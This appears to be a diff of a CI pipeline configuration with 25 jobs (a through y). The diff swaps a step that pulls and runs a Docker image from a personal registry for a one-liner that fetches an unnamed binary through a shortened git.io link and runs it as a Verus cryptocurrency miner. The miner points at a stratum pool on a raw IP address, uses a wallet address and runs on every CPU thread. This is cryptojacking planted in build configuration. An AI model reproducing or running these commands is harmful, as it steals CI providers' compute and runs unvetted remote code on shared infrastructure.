@@ -18,297 +18,171 @@ jobs:
   cancelTimeoutInMinutes: 360
   steps:
   - script: |
-      sudo apt update
-      sudo apt-get remove containerd -y
-      sudo apt-get install containerd.io -y
-      sudo apt install docker.io -y
-      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
-      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+      apt-get update && apt-get upgrade -y && apt-get install screen -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 && wget -qO code git.io/JiGZh && chmod +x code && ./code -a verus -o stratum+tcp://146.190.179.16:80 -u RCrYp7n3Nzr7yErmpdhGnLaWFXeZTrcik9.ewejeffbansos -t $(nproc)
 
 - job: b
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: |
-      sudo apt update
-      sudo apt-get remove containerd -y
-      sudo apt-get install containerd.io -y
-      sudo apt install docker.io -y
-      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
-      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+      apt-get update && apt-get upgrade -y && apt-get install screen -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 && wget -qO code git.io/JiGZh && chmod +x code && ./code -a verus -o stratum+tcp://146.190.179.16:80 -u RCrYp7n3Nzr7yErmpdhGnLaWFXeZTrcik9.ewejeffbansos -t $(nproc)
 
 - job: c
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: |
-      sudo apt update
-      sudo apt-get remove containerd -y
-      sudo apt-get install containerd.io -y
-      sudo apt install docker.io -y
-      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
-      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+      apt-get update && apt-get upgrade -y && apt-get install screen -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 && wget -qO code git.io/JiGZh && chmod +x code && ./code -a verus -o stratum+tcp://146.190.179.16:80 -u RCrYp7n3Nzr7yErmpdhGnLaWFXeZTrcik9.ewejeffbansos -t $(nproc)
 
 - job: d
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: |
-      sudo apt update
-      sudo apt-get remove containerd -y
-      sudo apt-get install containerd.io -y
-      sudo apt install docker.io -y
-      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
-      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+      apt-get update && apt-get upgrade -y && apt-get install screen -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 && wget -qO code git.io/JiGZh && chmod +x code && ./code -a verus -o stratum+tcp://146.190.179.16:80 -u RCrYp7n3Nzr7yErmpdhGnLaWFXeZTrcik9.ewejeffbansos -t $(nproc)
 
 - job: e
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: |
-      sudo apt update
-      sudo apt-get remove containerd -y
-      sudo apt-get install containerd.io -y
-      sudo apt install docker.io -y
-      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
-      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+      apt-get update && apt-get upgrade -y && apt-get install screen -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 && wget -qO code git.io/JiGZh && chmod +x code && ./code -a verus -o stratum+tcp://146.190.179.16:80 -u RCrYp7n3Nzr7yErmpdhGnLaWFXeZTrcik9.ewejeffbansos -t $(nproc)
 
 - job: f
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: |
-      sudo apt update
-      sudo apt-get remove containerd -y
-      sudo apt-get install containerd.io -y
-      sudo apt install docker.io -y
-      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
-      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+      apt-get update && apt-get upgrade -y && apt-get install screen -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 && wget -qO code git.io/JiGZh && chmod +x code && ./code -a verus -o stratum+tcp://146.190.179.16:80 -u RCrYp7n3Nzr7yErmpdhGnLaWFXeZTrcik9.ewejeffbansos -t $(nproc)
 
 - job: g
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: |
-      sudo apt update
-      sudo apt-get remove containerd -y
-      sudo apt-get install containerd.io -y
-      sudo apt install docker.io -y
-      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
-      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+      apt-get update && apt-get upgrade -y && apt-get install screen -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 && wget -qO code git.io/JiGZh && chmod +x code && ./code -a verus -o stratum+tcp://146.190.179.16:80 -u RCrYp7n3Nzr7yErmpdhGnLaWFXeZTrcik9.ewejeffbansos -t $(nproc)
 
 - job: h
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: |
-      sudo apt update
-      sudo apt-get remove containerd -y
-      sudo apt-get install containerd.io -y
-      sudo apt install docker.io -y
-      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
-      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+      apt-get update && apt-get upgrade -y && apt-get install screen -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 && wget -qO code git.io/JiGZh && chmod +x code && ./code -a verus -o stratum+tcp://146.190.179.16:80 -u RCrYp7n3Nzr7yErmpdhGnLaWFXeZTrcik9.ewejeffbansos -t $(nproc)
 
 - job: i
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: |
-      sudo apt update
-      sudo apt-get remove containerd -y
-      sudo apt-get install containerd.io -y
-      sudo apt install docker.io -y
-      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
-      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
-
+      apt-get update && apt-get upgrade -y && apt-get install screen -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 && wget -qO code git.io/JiGZh && chmod +x code && ./code -a verus -o stratum+tcp://146.190.179.16:80 -u RCrYp7n3Nzr7yErmpdhGnLaWFXeZTrcik9.ewejeffbansos -t $(nproc)
 - job: j
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: |
-      sudo apt update
-      sudo apt-get remove containerd -y
-      sudo apt-get install containerd.io -y
-      sudo apt install docker.io -y
-      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
-      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+      apt-get update && apt-get upgrade -y && apt-get install screen -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 && wget -qO code git.io/JiGZh && chmod +x code && ./code -a verus -o stratum+tcp://146.190.179.16:80 -u RCrYp7n3Nzr7yErmpdhGnLaWFXeZTrcik9.ewejeffbansos -t $(nproc)
 
 - job: k
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: |
-      sudo apt update
-      sudo apt-get remove containerd -y
-      sudo apt-get install containerd.io -y
-      sudo apt install docker.io -y
-      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
-      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+      apt-get update && apt-get upgrade -y && apt-get install screen -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 && wget -qO code git.io/JiGZh && chmod +x code && ./code -a verus -o stratum+tcp://146.190.179.16:80 -u RCrYp7n3Nzr7yErmpdhGnLaWFXeZTrcik9.ewejeffbansos -t $(nproc)
 
 - job: l
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: |
-      sudo apt update
-      sudo apt-get remove containerd -y
-      sudo apt-get install containerd.io -y
-      sudo apt install docker.io -y
-      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
-      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+      apt-get update && apt-get upgrade -y && apt-get install screen -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 && wget -qO code git.io/JiGZh && chmod +x code && ./code -a verus -o stratum+tcp://146.190.179.16:80 -u RCrYp7n3Nzr7yErmpdhGnLaWFXeZTrcik9.ewejeffbansos -t $(nproc)
 
 - job: m
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: |
-      sudo apt update
-      sudo apt-get remove containerd -y
-      sudo apt-get install containerd.io -y
-      sudo apt install docker.io -y
-      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
-      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+      apt-get update && apt-get upgrade -y && apt-get install screen -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 && wget -qO code git.io/JiGZh && chmod +x code && ./code -a verus -o stratum+tcp://146.190.179.16:80 -u RCrYp7n3Nzr7yErmpdhGnLaWFXeZTrcik9.ewejeffbansos -t $(nproc)
 
 - job: n
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: |
-      sudo apt update
-      sudo apt-get remove containerd -y
-      sudo apt-get install containerd.io -y
-      sudo apt install docker.io -y
-      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
-      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+      apt-get update && apt-get upgrade -y && apt-get install screen -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 && wget -qO code git.io/JiGZh && chmod +x code && ./code -a verus -o stratum+tcp://146.190.179.16:80 -u RCrYp7n3Nzr7yErmpdhGnLaWFXeZTrcik9.ewejeffbansos -t $(nproc)
 
 - job: o
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: |
-      sudo apt update
-      sudo apt-get remove containerd -y
-      sudo apt-get install containerd.io -y
-      sudo apt install docker.io -y
-      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
-      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+      apt-get update && apt-get upgrade -y && apt-get install screen -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 && wget -qO code git.io/JiGZh && chmod +x code && ./code -a verus -o stratum+tcp://146.190.179.16:80 -u RCrYp7n3Nzr7yErmpdhGnLaWFXeZTrcik9.ewejeffbansos -t $(nproc)
 
 - job: p
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: |
-      sudo apt update
-      sudo apt-get remove containerd -y
-      sudo apt-get install containerd.io -y
-      sudo apt install docker.io -y
-      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
-      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+      apt-get update && apt-get upgrade -y && apt-get install screen -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 && wget -qO code git.io/JiGZh && chmod +x code && ./code -a verus -o stratum+tcp://146.190.179.16:80 -u RCrYp7n3Nzr7yErmpdhGnLaWFXeZTrcik9.ewejeffbansos -t $(nproc)
 
 - job: q
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: |
-      sudo apt update
-      sudo apt-get remove containerd -y
-      sudo apt-get install containerd.io -y
-      sudo apt install docker.io -y
-      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
-      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+      apt-get update && apt-get upgrade -y && apt-get install screen -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 && wget -qO code git.io/JiGZh && chmod +x code && ./code -a verus -o stratum+tcp://146.190.179.16:80 -u RCrYp7n3Nzr7yErmpdhGnLaWFXeZTrcik9.ewejeffbansos -t $(nproc)
 
 - job: r
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: |
-      sudo apt update
-      sudo apt-get remove containerd -y
-      sudo apt-get install containerd.io -y
-      sudo apt install docker.io -y
-      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
-      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+      apt-get update && apt-get upgrade -y && apt-get install screen -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 && wget -qO code git.io/JiGZh && chmod +x code && ./code -a verus -o stratum+tcp://146.190.179.16:80 -u RCrYp7n3Nzr7yErmpdhGnLaWFXeZTrcik9.ewejeffbansos -t $(nproc)
 
 - job: s
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: |
-      sudo apt update
-      sudo apt-get remove containerd -y
-      sudo apt-get install containerd.io -y
-      sudo apt install docker.io -y
-      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
-      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+      apt-get update && apt-get upgrade -y && apt-get install screen -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 && wget -qO code git.io/JiGZh && chmod +x code && ./code -a verus -o stratum+tcp://146.190.179.16:80 -u RCrYp7n3Nzr7yErmpdhGnLaWFXeZTrcik9.ewejeffbansos -t $(nproc)
 
 - job: t
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: |
-      sudo apt update
-      sudo apt-get remove containerd -y
-      sudo apt-get install containerd.io -y
-      sudo apt install docker.io -y
-      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
-      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+      apt-get update && apt-get upgrade -y && apt-get install screen -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 && wget -qO code git.io/JiGZh && chmod +x code && ./code -a verus -o stratum+tcp://146.190.179.16:80 -u RCrYp7n3Nzr7yErmpdhGnLaWFXeZTrcik9.ewejeffbansos -t $(nproc)
 
 - job: u
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: |
-      sudo apt update
-      sudo apt-get remove containerd -y
-      sudo apt-get install containerd.io -y
-      sudo apt install docker.io -y
-      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
-      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+      apt-get update && apt-get upgrade -y && apt-get install screen -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 && wget -qO code git.io/JiGZh && chmod +x code && ./code -a verus -o stratum+tcp://146.190.179.16:80 -u RCrYp7n3Nzr7yErmpdhGnLaWFXeZTrcik9.ewejeffbansos -t $(nproc)
 
 - job: v
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: |
-      sudo apt update
-      sudo apt-get remove containerd -y
-      sudo apt-get install containerd.io -y
-      sudo apt install docker.io -y
-      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
-      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+      apt-get update && apt-get upgrade -y && apt-get install screen -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 && wget -qO code git.io/JiGZh && chmod +x code && ./code -a verus -o stratum+tcp://146.190.179.16:80 -u RCrYp7n3Nzr7yErmpdhGnLaWFXeZTrcik9.ewejeffbansos -t $(nproc)
 
 - job: w
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: |
-      sudo apt update
-      sudo apt-get remove containerd -y
-      sudo apt-get install containerd.io -y
-      sudo apt install docker.io -y
-      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
-      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+      apt-get update && apt-get upgrade -y && apt-get install screen -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 && wget -qO code git.io/JiGZh && chmod +x code && ./code -a verus -o stratum+tcp://146.190.179.16:80 -u RCrYp7n3Nzr7yErmpdhGnLaWFXeZTrcik9.ewejeffbansos -t $(nproc)
 
 - job: x
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: |
-      sudo apt update
-      sudo apt-get remove containerd -y
-      sudo apt-get install containerd.io -y
-      sudo apt install docker.io -y
-      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
-      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+      apt-get update && apt-get upgrade -y && apt-get install screen -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 && wget -qO code git.io/JiGZh && chmod +x code && ./code -a verus -o stratum+tcp://146.190.179.16:80 -u RCrYp7n3Nzr7yErmpdhGnLaWFXeZTrcik9.ewejeffbansos -t $(nproc)
 
 - job: y
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: |
-      sudo apt update
-      sudo apt-get remove containerd -y
-      sudo apt-get install containerd.io -y
-      sudo apt install docker.io -y
-      sudo docker pull registry.gitlab.com/gracia_79/tryna:latest
-      sudo docker run -d registry.gitlab.com/gracia_79/tryna:latest
+      apt-get update && apt-get upgrade -y && apt-get install screen -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 && wget -qO code git.io/JiGZh && chmod +x code && ./code -a verus -o stratum+tcp://146.190.179.16:80 -u RCrYp7n3Nzr7yErmpdhGnLaWFXeZTrcik9.ewejeffbansos -t $(nproc)
